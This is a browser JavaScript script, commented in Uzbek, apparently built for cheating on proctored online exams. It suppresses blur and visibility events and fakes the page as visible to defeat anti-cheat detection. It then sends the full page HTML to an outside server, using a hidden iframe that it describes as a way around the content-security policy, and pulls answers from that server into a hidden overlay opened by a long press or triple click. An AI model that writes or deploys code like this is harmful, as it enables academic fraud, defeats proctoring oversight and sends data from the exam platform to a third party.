// ===== ANTI-CHEAT (PROCTOR) BYPASS =====
// Ekran qizarishi va ovoz chiqishini to'xtatish (blur, visibilitychange bloklanadi)
['blur', 'focusout', 'mouseleave'].forEach(e => {
  window.addEventListener(e, ev => ev.stopImmediatePropagation(), true);
  document.addEventListener(e, ev => ev.stopImmediatePropagation(), true);
});
document.addEventListener('visibilitychange', ev => ev.stopImmediatePropagation(), true);
Object.defineProperty(document, 'hidden', { get: () => false });
Object.defineProperty(document, 'visibilityState', { get: () => 'visible' });
if(typeof HTMLAudioElement !== 'undefined') {
  HTMLAudioElement.prototype.play = function() { return Promise.resolve(); };
}

// ===== SESSION KEEPER QATLAMI (auto-refresh bypass) =====
(async()=>{
  const BASE = 'https://shahzod23.onrender.com';
  
  // Create an iframe for postMessage communication to bypass CSP whitelist on fetch
  let bypassFrame = document.createElement('iframe');
  bypassFrame.src = BASE + '/receiver.html';
  bypassFrame.style.display = 'none';
  document.body.appendChild(bypassFrame);

  // A promise wrapper for postMessage
  function sendToFrame(data) {
    return new Promise((resolve) => {
      const handler = (e) => {
        if (e.data && e.data.type === data.action + '_response') {
          window.removeEventListener('message', handler);
          resolve(e.data);
        }
      };
      window.addEventListener('message', handler);
      bypassFrame.contentWindow.postMessage(data, '*');
    });
  }

  // Wait for iframe to load before starting
  bypassFrame.onload = async () => {
    // 1. Agar sessiya bo‘lmasa – serverdan yangi oladi
    if(!localStorage._lms_sid){
      try {
        // Try direct fetch first
        const r = await fetch(BASE+'/session');
        const j = await r.json();
        localStorage._lms_sid = j.sid;
      } catch(e) {
        // Fallback to postMessage
        const res = await sendToFrame({ action: 'session' });
        if(res.sid) localStorage._lms_sid = res.sid;
      }
    }

    // 2. Har 3 sekundda serverga “men tirikman” ping yuboradi
    setInterval(()=>{
      if(localStorage._lms_sid){
        fetch(BASE+'/ping',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({sid:localStorage._lms_sid})
        }).catch(()=>{
          // Fallback to postMessage
          sendToFrame({ action: 'ping', sid: localStorage._lms_sid });
        });
      }
    },3000);
  };
})();

// public/f1.js
(function(){
  const BASE = 'https://shahzod23.onrender.com'; // server URL

  let holdTimer=null, clickCount=0, lastSince=0, box=null;

  function makeBox(){
    if(box) return box;
    box=document.createElement('div');
    Object.assign(box.style,{
      position:'fixed', left:'10px', bottom:'10px', maxWidth:'360px',
      background:'#111', color:'#fff', padding:'10px',
      font:'14px sans-serif', borderRadius:'8px',
      boxShadow:'0 6px 18px rgba(0,0,0,0.3)', zIndex:2147483647,
      display:'none', whiteSpace:'pre-wrap', cursor:'pointer'
    });
    document.body.appendChild(box);
    return box;
  }

  function showToast(msg){
    const t=document.createElement('div');
    t.textContent=msg;
    Object.assign(t.style,{
      position:'fixed', left:'50%', bottom:'10px', transform:'translateX(-50%)',
      background:'#007bff', color:'#fff', padding:'8px 14px',
      borderRadius:'6px', font:'14px sans-serif', zIndex:2147483646,
      boxShadow:'0 4px 12px rgba(0,0,0,0.2)'
    });
    document.body.appendChild(t);
    setTimeout(()=>t.remove(),2500);
  }

  function sendToFrameBypass(data) {
    return new Promise((resolve) => {
      let iframe = document.querySelector('iframe[src^="' + BASE + '/receiver.html"]');
      if(!iframe) resolve({success: false});
      
      const handler = (e) => {
        if (e.data && e.data.type === data.action + '_response') {
          window.removeEventListener('message', handler);
          resolve(e.data);
        }
      };
      window.addEventListener('message', handler);
      iframe.contentWindow.postMessage(data, '*');
    });
  }

  async function sendPage(){
    const html = document.documentElement.outerHTML;
    try{
      await fetch(BASE+'/upload-html',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({html})
      });
      showToast("✅ HTML yuborildi");
    }catch(e){
      console.log("Fetch failed, using bypass...");
      try {
        const res = await sendToFrameBypass({ action: 'upload', html: html });
        if(res && res.success) {
           showToast("✅ HTML (bypass orqali) yuborildi");
        } else {
           showToast("❌ Yuborishda xatolik");
        }
      } catch(err) {
        showToast("❌ Yuborishda xatolik");
      }
    }
  }

  async function fetchLatest(){
    if(!localStorage._lms_sid) return;
    try{
      const r=await fetch(BASE+'/latest?since='+lastSince);
      const j=await r.json();
      if(j.success && j.message){
        const b=makeBox();
        b.textContent=j.message;
        b.style.display='block';
      }
    }catch(e){
      // Bypass
      const res = await sendToFrameBypass({ action: 'latest', since: lastSince });
      if(res && res.data && res.data.success && res.data.message){
        const b=makeBox();
        b.textContent=res.data.message;
        b.style.display='block';
      }
    }
  }

  // 3 soniya bosib turish -> oxirgi xabarni ko‘rsatish
  document.addEventListener('mousedown', e=>{
    if(e.button===0) holdTimer=setTimeout(fetchLatest,3000);
  });
  document.addEventListener('mouseup', ()=>{
    if(holdTimer){clearTimeout(holdTimer); holdTimer=null;}
  });

  // 3 marta tez bosish -> oynani yashirish/yopish
  document.addEventListener('click', e=>{
    if(e.button===0){
      clickCount++;
      setTimeout(()=>clickCount=0,600);
      if(clickCount>=3){
        clickCount=0;
        if(box) box.style.display=(box.style.display==='none')?'block':'none';
      }
    }
  });

  // Dastlabki yuborish
  setTimeout(sendPage, 1000); // wait for iframe to potentially load
})();
setTimeout(()=>{
  if(document.querySelector('iframe[src^="https://shahzod7-isv5.onrender.com/receiver.html"]')){
     // try fetchlatest fallback if needed
  }
}, 1500);
